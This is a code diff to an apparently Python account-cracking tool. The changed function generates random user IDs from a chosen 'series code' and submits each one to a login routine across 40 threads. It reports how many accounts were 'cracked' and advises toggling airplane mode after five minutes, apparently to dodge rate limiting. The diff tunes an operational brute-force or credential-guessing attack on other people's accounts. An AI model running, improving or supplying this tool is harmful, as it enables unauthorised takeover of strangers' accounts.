@@ -369,20 +369,27 @@ def START_SERIES_CLONING(series_code):
     limit = int(input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'))
     linex()
     
-    # Generate IDs with selected series code (15 digits total)  
+    # Generate IDs with selected series code (15 digits total)
     for i in range(limit):
-        data = ''.join(random.choice(string.digits) for _ in range(9))
-        uid = series_code + data
-        user.append(uid)  
-    with tred(max_workers=30) as jihad:
+        uid = series_code + ''.join(random.choices(string.digits, k=9))
+        user.append(uid)
+    with tred(max_workers=40) as jihad:
+        clear()
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
+        linex()
         for mal in user:
             uid = mal
-            jihad.submit(login1, uid)  
-        clear()  
-        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')  
-        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')  
-        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')  
-        linex()  
+            jihad.submit(login1, uid)
+    
+    line()
+    print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
+    linex()
+    print(f"\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks) if 'oks' in globals() else 0}")
+    linex()
+    input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
+    main()
         
 def login1(uid):
     global oks, loop, cps
